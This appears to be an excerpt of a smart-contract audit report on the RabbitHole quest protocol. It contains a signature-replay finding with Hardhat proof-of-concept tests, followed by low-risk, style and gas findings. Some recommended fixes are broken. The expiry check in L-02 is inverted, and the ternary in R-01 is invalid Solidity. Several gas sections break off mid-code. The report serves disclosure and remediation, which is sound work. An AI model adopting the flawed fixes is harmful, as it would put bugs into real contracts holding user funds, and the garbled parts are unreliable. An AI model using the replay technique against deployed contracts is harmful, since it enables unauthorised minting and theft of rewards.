The `QuestFactory.mintReceipt` function mints `RabbitHoleReceipt` tokens based upon signatures signed by `claimSignerAddress`.

```solidity
    function mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {
        if (quests[questId_].numberMinted + 1 > quests[questId_].totalParticipants) revert OverMaxAllowedToMint();
        if (quests[questId_].addressMinted[msg.sender] == true) revert AddressAlreadyMinted();
        if (keccak256(abi.encodePacked(msg.sender, questId_)) != hash_) revert InvalidHash();
        if (recoverSigner(hash_, signature_) != claimSignerAddress) revert AddressNotSigned();

        quests[questId_].addressMinted[msg.sender] = true;
        quests[questId_].numberMinted++;
        emit ReceiptMinted(msg.sender, questId_);
        rabbitholeReceiptContract.mint(msg.sender, questId_);
    }
```

In the above function only the account's address and quest id values are used to generate and validate the signature.

This causes various issues which are mentioned below:

1.  There is no deadline for the signatures. Once a signature is signed by `claimSignerAddress` that signature can be provided to `QuestFactory.mintReceipt` function to mint an RabbitholeReceipt token at any point in the future.

2.  The signature can be replayed on other EVM compatible chains on which RabbitHole protocol is deployed. The [docs](https://github.com/rabbitholegg/quest-protocol/tree/8c4c1f71221570b14a0479c216583342bd652d8d#deployments) mention other EVM chain addresses of the contracts which means the protocol will be deployed on multiple chains.

3.  The signature can be replayed on multiple instances of QuestFactory contract. If multiple QuestFactory contracts are deployed on a single EVM chain then signature intended for one contract can be replayed on the other ones.

Note that all these scenarios are true when `questId_` parameter stays same.

### Actual Impact

Exploitation using the above mentioned scenarios will lead to unintended minting of RabbitholeReceipt token. This is a crucial token for the protocol which is also used to claim rewards from Quest contracts. Hence any unintentional minting will cause loss of funds.

### Proof of Concept

The test cases were added in `./test/QuestFactory.spec.ts` file and ran using command `npx hardhat test ./test/QuestFactory.spec.ts`.

```typescript
  describe.only('QuestFactory: Signature Replay Bug', () => {
    it('Signature can be used in different QuestFactory instance or on different chain', async () => {
      const randomUser = (await ethers.getSigners())[10];
      const questA = "A";

      // Sign message and create new Quest
      const messageHash = utils.solidityKeccak256(['address', 'string'], [randomUser.address.toLowerCase(), questA])
      const signature = await wallet.signMessage(utils.arrayify(messageHash))
      await deployedFactoryContract.setRewardAllowlistAddress(deployedSampleErc20Contract.address, true)
      await deployedFactoryContract.createQuest(
        deployedSampleErc20Contract.address, expiryDate, startDate, totalRewards, rewardAmount, 'erc20', questA
      )

      // Use the signature on First QuestFactory
      await deployedFactoryContract.connect(randomUser).mintReceipt(questA, messageHash, signature)
      expect(await deployedRabbitHoleReceiptContract.balanceOf(randomUser.address)).to.equal(1)

      const factoryPrevious = deployedFactoryContract
      const RHRPrevious = deployedRabbitHoleReceiptContract

      // Deploy a new QuestFactory (this could be on a different chain)
      await deployRabbitHoleReceiptContract()
      await deployFactoryContract()

      expect(factoryPrevious.address).to.not.eq(deployedFactoryContract.address)            // Verify we have new instance
      expect(RHRPrevious.address).to.not.eq(deployedRabbitHoleReceiptContract.address)

      // Create new Quest in new QuestFactory
      await deployedFactoryContract.setRewardAllowlistAddress(deployedSampleErc20Contract.address, true)
      await deployedFactoryContract.createQuest(
        deployedSampleErc20Contract.address, expiryDate, startDate, totalRewards, rewardAmount, 'erc20', questA
      )

      // Use the previously used signature again on new QuestFactory
      await deployedFactoryContract.connect(randomUser).mintReceipt(questA, messageHash, signature)
      expect(await deployedRabbitHoleReceiptContract.balanceOf(randomUser.address)).to.equal(1)
      expect(await RHRPrevious.balanceOf(randomUser.address)).to.equal(1)
    })

    it('Signature can be used after 1 year', async () => {
      const randomUser = (await ethers.getSigners())[10];
      const questA = "A";

      // Sign message and create new Quest
      const messageHash = utils.solidityKeccak256(['address', 'string'], [randomUser.address.toLowerCase(), questA])
      const signature = await wallet.signMessage(utils.arrayify(messageHash))
      await deployedFactoryContract.setRewardAllowlistAddress(deployedSampleErc20Contract.address, true)
      await deployedFactoryContract.createQuest(
        deployedSampleErc20Contract.address, expiryDate, startDate, totalRewards, rewardAmount, 'erc20', questA
      )

      // Move ahead 1 year
      await ethers.provider.send("evm_mine", [expiryDate + 31536000])

      // Use the signature
      await deployedFactoryContract.connect(randomUser).mintReceipt(questA, messageHash, signature)
      expect(await deployedRabbitHoleReceiptContract.balanceOf(randomUser.address)).to.equal(1)
    })
  })
```

### Tools Used

Hardhat

### Recommended Mitigation Steps

Consider including deadline, chainid and QuestFactory's address in the signature message. Ideally signatures should be created according to the [EIP712](https://eips.ethereum.org/EIPS/eip-712) standard.

**[kirk-baird (judge) decreased severity to Medium](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/107#issuecomment-1429416312)**

**[waynehoover (RabbitHole) disagreed with severity and commented via duplicate issue `#45`](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/45#issuecomment-1421424612):**
 > You canâ€™t run a Quest on multiple chains, the assumption is incorrect there.

 > This issue is rated medium as signatures cannot be replayed on this contract, they can only be replayed on other contracts. They may be replayed on other contracts on the same chain or different chains. If there was the possibility for signature replay on this contract then it would be rated as high.

**[AkshaySrivastav (warden) commented via duplicate issue `#45`](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/45#issuecomment-1441252597):**
 > @kirk-baird - The protocol docs clearly stated the intention of deploying the contracts on multiple chains, even contract addresses were provided. Considering that, the attack is very likely to happen with clear loss of funds (high impact + high likelihood).

**[kirk-baird (judge) commented via duplicate issue `#45`](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/45#issuecomment-1441399684):**
 > @AkshaySrivastav - I do not believe high likelihood is appropriate here. I agree protocol will be deployed on multiple chains, however for the signature replay to be valid the pair `(questId, signer)`  must match on different chains.
> 
> As stated by the sponsor each quest should only be run on a single chain such that this overlap is unlikely. Furthermore, even if a quest is run on multiple chains starting at the same time it will likely not have the same `questId` as this is a counter incremented for each created quest unique to each chain. Note an attacker may deliberately manipualte this by using a front-running attack in the mempool.
> 
> To provide some arguements for the severity it is possible for a quest owner to use the same signer on multiple quests over multiple chains and there is a possibility two of these quests have overlapping ID on different chains. However, this is not a high likelihood situation and thus I think medium severity is most appropriate here.

## [L-01] `createQuest` doesn't check if the reward token address is in the allow list on ERC-1155 quest type
The function `createQuest` is called by users with the quest role. The main purpose of the function is to create quests, which can be either erc20 or erc1155 type. When the type is erc20, a check is made to ensure the rewardTokenAddress\_ is allowed to be used as a reward - `if (rewardAllowlist[rewardTokenAddress_] == false) revert RewardNotAllowed();`. The problem is that the same check isn't made when the quest is erc1155, as a result when erc1155 quest is created the function createQuest doesn't check if the rewardTokenAddress\_ is in the allow list.

115:                address(rabbitholeReceiptContract)
116:            );
117:
118:            emit QuestCreated(
119:                msg.sender,
120:                address(newQuest),
121:                questId_,
122:                contractType_,
123:                rewardTokenAddress_,
124:                endTime_,
125:                startTime_,

132:            ++questIdCount;
133:            return address(newQuest);
134:        }
135:
136:        revert QuestTypeInvalid();
137:    }
```

Consider adding a check to ensure the contract address is allowed to be used as a reward on erc1155 quests as well:

```solidity
105:        if (keccak256(abi.encodePacked(contractType_)) == keccak256(abi.encodePacked('erc1155'))) {
106:            if (msg.sender != owner()) revert OnlyOwnerCanCreate1155Quest();
+               if (rewardAllowlist[rewardTokenAddress_] == false) revert RewardNotAllowed();
```

## [L-02] The function mintReceipt should check if the quest has expired on-chain as well
The main function mintReceipt responsible for minting receipts lacks an important check to ensure the quest end time hasn't finished yet. Considering the fact that on quest creation every quest is enforced with a startTime and endTime, which represents the quest starting time and ending time. Users should not be allowed to mint receipts after the quest is expired.

By the sponsor comment, the `claimSignerAddress` takes care of that on the off-chain side and won't issue hashes before the quest start or after the quest ends. But mistakes always can occur and it is recommended to have a check on the smart contract level as well.

```solidity
contracts/QuestFactory.sol

219:  function mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {
220:        if (quests[questId_].numberMinted + 1 > quests[questId_].totalParticipants) revert OverMaxAllowedToMint();
221:        if (quests[questId_].addressMinted[msg.sender] == true) revert AddressAlreadyMinted();
222:        if (keccak256(abi.encodePacked(msg.sender, questId_)) != hash_) revert InvalidHash();
223:        if (recoverSigner(hash_, signature_) != claimSignerAddress) revert AddressNotSigned();
224:
225:        quests[questId_].addressMinted[msg.sender] = true;
226:        quests[questId_].numberMinted++;
227:        emit ReceiptMinted(msg.sender, questId_);
228:        rabbitholeReceiptContract.mint(msg.sender, questId_);
229:    }
```

Here is a recommended change, which takes care of this problem:

1. Add a storage variable in the struct `Quest`, which will hold the end time of the quest.

```solidity
struct Quest {
        mapping(address => bool) addressMinted;
        address questAddress;
        uint totalParticipants;
        uint numberMinted;
+       uint256 expires;
    }
```

2. When creating a quest with the function `createQuest` consider adding the endTime to the new stor variable `expires`.

```solidity
// Add the same check if contractType is erc1155 as well.

if (keccak256(abi.encodePacked(contractType_)) == keccak256(abi.encodePacked('erc20'))) {
            if (rewardAllowlist[rewardTokenAddress_] == false) revert RewardNotAllowed();

            Erc20Quest newQuest = new Erc20Quest(
                rewardTokenAddress_,
                endTime_,
                startTime_,
                totalParticipants_,
                rewardAmountOrTokenId_,
                questId_,
                address(rabbitholeReceiptContract),
                questFee,
                protocolFeeRecipient
            );

            emit QuestCreated(
                msg.sender,
                address(newQuest),
                questId_,
                contractType_,
                rewardTokenAddress_,
                endTime_,
                startTime_,
                totalParticipants_,
                rewardAmountOrTokenId_
            );
            quests[questId_].questAddress = address(newQuest);
            quests[questId_].totalParticipants = totalParticipants_;
+           quests[questId_].expires = endTime_;
            newQuest.transferOwnership(msg.sender);
            ++questIdCount;
            return address(newQuest);
        }
```

3. And finally add a check in the function `mintReceipt` to check if the quest expired already.

```solidity
function mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {
+       if (quests[questId_].expires > block.timestamp) revert QuestAlreadyExpired();
        if (quests[questId_].numberMinted + 1 > quests[questId_].totalParticipants) revert OverMaxAllowedToMint();
        if (quests[questId_].addressMinted[msg.sender] == true) revert AddressAlreadyMinted();
        if (keccak256(abi.encodePacked(msg.sender, questId_)) != hash_) revert InvalidHash();
        if (recoverSigner(hash_, signature_) != claimSignerAddress) revert AddressNotSigned();

        quests[questId_].addressMinted[msg.sender] = true;
        quests[questId_].numberMinted++;
        emit ReceiptMinted(msg.sender, questId_);
        rabbitholeReceiptContract.mint(msg.sender, questId_);
    }
```

## [L-03] The reverting functions `_calculateRewards` and `_transferRewards` should be removed, as they are already implemented in the child contract
There are two functions in Quest.sol, which reverts incase they are called. By the revert names, we can understand that these two functions need to be implemented in the child contracts - Erc20Quest.sol, Erc1155Quest.sol. Since this is already done and they are implemented in the child contracts, these two functions are unnecessary and should be removed.

```solidity
contracts/Quest.sol

122:  function _calculateRewards(uint256 redeemableTokenCount_) internal virtual returns (uint256) {
123:        revert MustImplementInChild();
124:    }

129:  function _transferRewards(uint256 amount_) internal virtual {
130:        revert MustImplementInChild();
131:    }
```

## [L-04] The function `withdrawRemainingTokens` can be changed in a safer way to handle the withdraw from the owner and the protocol fee as well. This prevent risks allocated with the protocol fees.
By the docs this function is called in two different scenarios, if a quest is full and receipt redeemers equals the max amount of total participants allowed in the quest - only withdrawFee is called. If a quest doesn't hit the max total participants, first the owner calls the function `withdrawRemainingTokens` to withdraw the remaining tokens and then the fee should be paid with the function `withdrawFee`.

Overall the best solution of this problem is that the function `withdrawRemainingTokens`, both does the withdrawing part to the owner and pays the fee to the protocol as well. This is considered the safest way:

First, if the receipt redeemers are below the totalParticipants, can withdraw the remaining tokens and pay the fee at the same time. Second, if the quest is full and receipt redemeers hits the total amount of people allowed, only the fee will be paid to the protocol and will skip the withdraw remaining rewards part.

```solidity
function withdrawRemainingTokens(address to_) public override onlyOwner {
        super.withdrawRemainingTokens(to_);

        if (receiptRedeemers() < totalParticipants) {

        uint unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;
        uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;
        IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);

        IERC20(rewardToken).safeTransfer(protocolFeeRecipient, protocolFee());

        } else {

        IERC20(rewardToken).safeTransfer(protocolFeeRecipient, protocolFee());

        }
    }
```

## [L-05] The function `royaltyInfo` doesn't check if the receipt was already claimed
The function `royaltyInfo` is used by users to check sale details regarding a particular ERC721 token.

The problem here is that the function check if the token exists, but doesn't check if the token was already claimed.

Consider applying a check, which will revert if the token was already claimed.

```solidity
contracts/RabbitHoleReceipt.sol

178:  function royaltyInfo(
179:        uint256 tokenId_,
180:        uint256 salePrice_
181:    ) external view override returns (address receiver, uint256 royaltyAmount) {
182:        require(_exists(tokenId_), 'Nonexistent token');
183:
184:        uint256 royaltyPayment = (salePrice_ * royaltyFee) / 10_000;
185:        return (royaltyRecipient, royaltyPayment);
186:    }
```

## [L-06] In contract Quest the function `claim` shouldn't only set the receipt as claimed, but to burn it as well. As this problem brings the risk, where users can sell already claimed receipts to other people
The function `claim` is used by users to claim their ERC721 receipts for rewards. By using the function the receipt is set as claimed with a simple mapping id => bool, but it isn't burned. In the protocol docs it is clearly stated that users are free to sell or trade their receipts. Since the claimed receipts aren't burned, this bring the risk where already claimed receipts can be sold to other people. A burn function already exists in RabbitHoleReceipt, but isn't used.

## [L-07] The function `mintReceipt` shouldn't mint receipts to users, if the quest is paused
For now the function `mintReceipt` doesn't issue hashes before the quest has started or after the quest has ended. 

This is done off-chain with the help of `claimSignerAddress`, but the off-chain side doesn't check if a quest is in paused state.

So even if a quest is in paused state duo to some sort of issue occurring, the function `mintReceipt` can still mint receipts for this particular quest.

```solidity
contracts/QuestFactory.sol

219:  function mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {
220:        if (quests[questId_].numberMinted + 1 > quests[questId_].totalParticipants) revert OverMaxAllowedToMint();
221:        if (quests[questId_].addressMinted[msg.sender] == true) revert AddressAlreadyMinted();
222:        if (keccak256(abi.encodePacked(msg.sender, questId_)) != hash_) revert InvalidHash();
223:        if (recoverSigner(hash_, signature_) != claimSignerAddress) revert AddressNotSigned();
224:
225:        quests[questId_].addressMinted[msg.sender] = true;
226:        quests[questId_].numberMinted++;
227:        emit ReceiptMinted(msg.sender, questId_);
228:        rabbitholeReceiptContract.mint(msg.sender, questId_);
229:    }
```

A recommended change l thought of:

1. Create a private mapping, which will check if the quest address is paused

```solidity
mapping(string => bool) private isPaused;
```

2. Create an owner function, so the owner can change the state of the mapping. 

```solidity
function setQuestState(string questId_, bool _paused) public onlyOwner {
        isPaused[questId_] = _paused;
    }
```

3. Apply the check in `mintReceipt`, so users won't be able claim receipts, when the quest is paused.

```solidity
function mintReceipt(string memory questId_, bytes32 hash_, bytes memory signature_) public {
+       if (isPaused[questId_] == true) revert QuestPaused();
        if (quests[questId_].numberMinted + 1 > quests[questId_].totalParticipants) revert OverMaxAllowedToMint();
        if (quests[questId_].addressMinted[msg.sender] == true) revert AddressAlreadyMinted();
        if (keccak256(abi.encodePacked(msg.sender, questId_)) != hash_) revert InvalidHash();
        if (recoverSigner(hash_, signature_) != claimSignerAddress) revert AddressNotSigned();

        quests[questId_].addressMinted[msg.sender] = true;
        quests[questId_].numberMinted++;
        emit ReceiptMinted(msg.sender, questId_);
        rabbitholeReceiptContract.mint(msg.sender, questId_);
    }
}
```

## [N-01] Confusing modifier name 
A confusing name is set on the modifier `onlyAdminWithdrawAfterEnd`. By its name it says only admin withdraw after end time, but at the same time the modifier only check if `block.timestamp < endTime`.

```solidity
contracts/Quest.sol

76:  modifier onlyAdminWithdrawAfterEnd() {
77:        if (block.timestamp < endTime) revert NoWithdrawDuringClaim();
78:        _;
79:    }
```

## [N-02] Deploying a storage variable with its default value
At a deploying time in the contract Quest, the storage variable `redeemedTokens` is set as zero, even though its default value is already zero.

```solidity
contracts/Quest.sol

26:  constructor(
27:        address rewardTokenAddress_,
28:        uint256 endTime_,
29:        uint256 startTime_,
30:        uint256 totalParticipants_,
31:        uint256 rewardAmountInWeiOrTokenId_,
32:        string memory questId_,
33:        address receiptContractAddress_
34:    ) {
35:        if (endTime_ <= block.timestamp) revert EndTimeInPast();
36:        if (startTime_ <= block.timestamp) revert StartTimeInPast();
37:        if (endTime_ <= startTime_) revert EndTimeLessThanOrEqualToStartTime();
38:        endTime = endTime_;
39:        startTime = startTime_;
40:        rewardToken = rewardTokenAddress_;
41:        totalParticipants = totalParticipants_;
42:        rewardAmountInWeiOrTokenId = rewardAmountInWeiOrTokenId_;
43:        questId = questId_;
44:        rabbitHoleReceiptContract = RabbitHoleReceipt(receiptContractAddress_);
45:        redeemedTokens = 0;
46    }
```

## [N-03] Modifiers not applied on the functions `start` and `withdrawRemainingTokens`
First with the function `start`, a quest should be started only by the owner, even tho the modifier is applied on the function `start` in Quest.sol. It should be added to the child contract as well.

```solidity
contracts/Erc20Quest.sol

58:  function start() public override {
59:        if (IERC20(rewardToken).balanceOf(address(this)) < maxTotalRewards() + maxProtocolReward())
60:            revert TotalAmountExceedsBalance();
61:        super.start();
62:    }
```

Consider adding the onlyOwner modifier to the function above:

```solidity
function start() public override onlyOwner {
        if (IERC20(rewardToken).balanceOf(address(this)) < maxTotalRewards() + maxProtocolReward())
            revert TotalAmountExceedsBalance();
        super.start();
    }
```

Same goes for the function `withdrawRemainingTokens`, an onlyOwner modifier is applied but the modifier which check if the quest ended is not. 

```solidity
contracts/Erc20Quest.sol

81:  function withdrawRemainingTokens(address to_) public override onlyOwner {
82:        super.withdrawRemainingTokens(to_);
83:
84:        uint unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;
85:        uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;
86:        IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);
87:    }
```

Consider adding the modifier `onlyAdminWithdrawAfterEnd` to the child contract as well:

```solidity
function withdrawRemainingTokens(address to_) public override onlyOwner onlyAdminWithdrawAfterEnd {
        super.withdrawRemainingTokens(to_);

        uint unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;
        uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;
        IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);
    }
```

## [N-04] Mandatory checks for extra safety in the setters
In the folowing functions below, there are some checks that can be made in order to achieve more safe and efficient code.

Address zero check can be added in the functions `setClaimSignerAddress`, `setRabbitHoleReceiptContract` to ensure the new addresses aren't address(0).

```solidity
contracts/QuestFactory.sol

159:  function setClaimSignerAddress(address claimSignerAddress_) public onlyOwner {
160:        claimSignerAddress = claimSignerAddress_;
161:    }

172:  function setRabbitHoleReceiptContract(address rabbitholeReceiptContract_) public onlyOwner {
173:        rabbitholeReceiptContract = RabbitHoleReceipt(rabbitholeReceiptContract_);
174:    }
```

In the function `setQuestFee` a check can be made to ensure the fee is set as non-zero.

```solidity
contracts/QuestFactory.sol

186:  function setQuestFee(uint256 questFee_) public onlyOwner {
187:        if (questFee_ > 10_000) revert QuestFeeTooHigh();
188:        questFee = questFee_;
189:    }
```

## [N-05] Lack of address(0) checks in the constructor
Zero-address check should be used in the constructors, to avoid the risk of setting smth as address(0) at deploying time.

```solidity
contracts/Quest.sol

26: constructor
```

## [N-06] Upgradeable contract is missing a `__gap[50]` storage variable
Reference: [Storage gaps](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps)

> You may notice that every contract includes a state variable named `__gap`. This is empty reserved space in storage that is put in place in Upgradeable contracts. It allows us to freely add new state variables in the future without compromising the storage compatibility with existing deployments.

Instances:

```solidity
contracts/QuestFactory.sol

16: contract QuestFactory is Initializable, OwnableUpgradeable, AccessControlUpgradeable, IQuestFactory {

contracts/RabbitHoleReceipt.sol

15: contract RabbitHoleReceipt is
```

## [R-01] Shorthand way to write if / else statement
The normal if / else statement can be refactored in a shorthand way to write it:

1. Increases readability
2. Shortens the overall SLOC

```solidity
contracts/QuestFactory.sol

142:  function changeCreateQuestRole(address account_, bool canCreateQuest_) public onlyOwner {
143:        if (canCreateQuest_) {
144:            _grantRole(CREATE_QUEST_ROLE, account_);
145:        } else {
146:            _revokeRole(CREATE_QUEST_ROLE, account_);
147:        }
148:    }
```

The above instance can be refactored in:

```solidity
function changeCreateQuestRole(address account_, bool canCreateQuest_) public onlyOwner {
        canCreateQuest_ ? _grantRole(CREATE_QUEST_ROLE, account_); : _revokeRole(CREATE_QUEST_ROLE, account_);
    }
```

## [R-02] Unnecessary true statement is applied in the function `isClaimed`
The function `isClaimed` checks if the given token id is claimed, for some reason there is an unnecessary true statement applied, which doesn't do anything.

```solidity
contracts/Quest.sol

135:  function isClaimed(uint256 tokenId_) public view returns (bool) {
136:        return claimedList[tokenId_] == true;
137:    }
```

Consider changing the above instance to:
```solidity

function isClaimed(uint256 tokenId_) public view returns (bool) {
        return claimedList[tokenId_];
   }
```

## [R-03] `isPaused` check can be added to the modifier `onlyQuestActive`, as it's used only on the claim function
In the `claim` function a check is made to ensure the quest isn't paused. Considering the fact that the modifier `onlyQuestActive` is only used once and it's on this particular function. The check can be refactored in the modifier instead of applying it in the function.

```solidity
contracts/Quest.sol

96:  function claim() public virtual onlyQuestActive {
97:        if (isPaused) revert QuestPaused();

88:  modifier onlyQuestActive() {
89:        if (!hasStarted) revert NotStarted();
90:        if (block.timestamp < startTime) revert ClaimWindowNotStarted();
91:        _;
92:    }
```

Refactor the modifier `onlyQuestActive` and remove the check from the function claim:

```solidity
modifier onlyQuestActive() {
        if (!hasStarted) revert NotStarted();
        if (block.timestamp < startTime) revert ClaimWindowNotStarted();
        if (isPaused) revert QuestPaused();
        _;
    }
```

## [R-04] Total minted check in `mintReceipt` can be refactored
In the function `mintReceipt` a check is made to see if the amount of already minted receipts doesn't exceed the amount of total participants allowed and the following if statement is used below. Instead of adding 1 to the total amount of minted receipts, the if statement can just be changed to `>=`, as it does the same thing.

`if (quests[questId_].numberMinted + 1 > quests[questId_].totalParticipants)` 

## [O-01] Floating pragma

Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.

Instances:
```solidity
contracts/QuestFactory.sol
contracts/RabbitHoleReceipt.sol
contracts/Quest.sol
contracts/RabbitHoleTickets.sol
contracts/Erc20Quest.sol
contracts/Erc1155Quest.sol
contracts/ReceiptRenderer.sol
contracts/TicketRenderer.sol
```

## [O-02] Code contains empty blocks

There are some empty blocks, which are unused.

The code should do something or at least have a description why it is structured that way.

Instances:
```solidity
contracts/QuestFactory.sol

35: constructor() initializer {}
```

## [O-03] Create your own import names instead of using the regular ones
For better readability, you should name the imports instead of using the regular ones.

Instances:
```solidity
contracts/RabbitHoleReceipt.sol
contracts/RabbitHoleTickets.sol
contracts/ReceiptRenderer.sol
contracts/TicketRenderer.sol
```

Gas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.

## [G&#x2011;01] Shorten the array rather than copying to a new one
Inline-assembly can be used to shorten the array by changing the length slot, so that the entries don't have to be copied to a new, shorter array

*There is 1 instance of this issue:*

```solidity
File: /contracts/RabbitHoleReceipt.sol

125          uint[] memory filteredTokens = new uint[](foundTokens);
126          uint filterTokensIndexTracker = 0;
127  
128          for (uint i = 0; i < msgSenderBalance; i++) {
129              if (tokenIdsForQuest[i] > 0) {
130                  filteredTokens[filterTokensIndexTracker] = tokenIdsForQuest[i];
131                  filterTokensIndexTracker++;
132              }
133:         }

## [G&#x2011;02] Hash shouldn't be re-calculated on every iteration of the `for`-loop
Calculate the hash outside of the loop, and use that value within the loop

*There is 1 instance of this issue:*

```solidity
File: /contracts/RabbitHoleReceipt.sol

119:             if (keccak256(bytes(questIdForTokenId[tokenId])) == keccak256(bytes(questId_))) {

```
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L119

## [G&#x2011;03] Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas
When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead. 

If the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one

Note that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved

## [G&#x2011;04] Multiple accesses of a mapping/array should use a local variable cache
The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata.

## [G&#x2011;06] `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables
Using the addition operator instead of plus-equals saves **[113 gas](https://gist.github.com/IllIllI000/cbbfb267425b898e5be734d4008d4fe8)**

*There is 1 instance of this issue:*

## [G&#x2011;07] `internal` functions only called once can be inlined to save gas
Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.

*There is 1 instance of this issue:*

```solidity

## [G&#x2011;08] `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops
The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**

## [G&#x2011;09] Optimize names to save gas
`public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92)

## [G&#x2011;10] String literals passed to `abi.encode()`/`abi.encodePacked()` should not be split by commas
String literals can be split into multiple parts and still be considered as a single string literal. Adding commas between each chunk makes it no longer a single string, and instead multiple strings. EACH new comma costs [***21 gas***](https://gist.github.com/IllIllI000/837d1b36c16c9bfe1010f9f775a09bbf) due to stack operations and separate `MSTORE`s.

## [G&#x2011;11] Using `private` rather than `public` for constants, saves gas
If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table.

## [G&#x2011;13] Use custom errors rather than `revert()`/`require()` strings to save gas
Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas.

## [G&#x2011;14] Functions guaranteed to revert when called by normal users can be marked `payable`
If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are 
`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost

Total: 41 instances over 6 issues with **68971 gas** saved

Gas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions.

### [G&#x2011;15] `<array>.length` should not be looked up in every loop of a `for`-loop
The overheads outlined below are _PER LOOP_, excluding the first loop
* storage arrays incur a Gwarmaccess (**100 gas**)
* memory arrays use `MLOAD` (**3 gas**)
* calldata arrays use `CALLDATALOAD` (**3 gas**)

Caching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset

### [G&#x2011;16] `require()`/`revert()` strings longer than 32 bytes cost extra gas
Each extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**.

### [G&#x2011;17] Using `bool`s for storage incurs overhead
```solidity
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

Use `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past
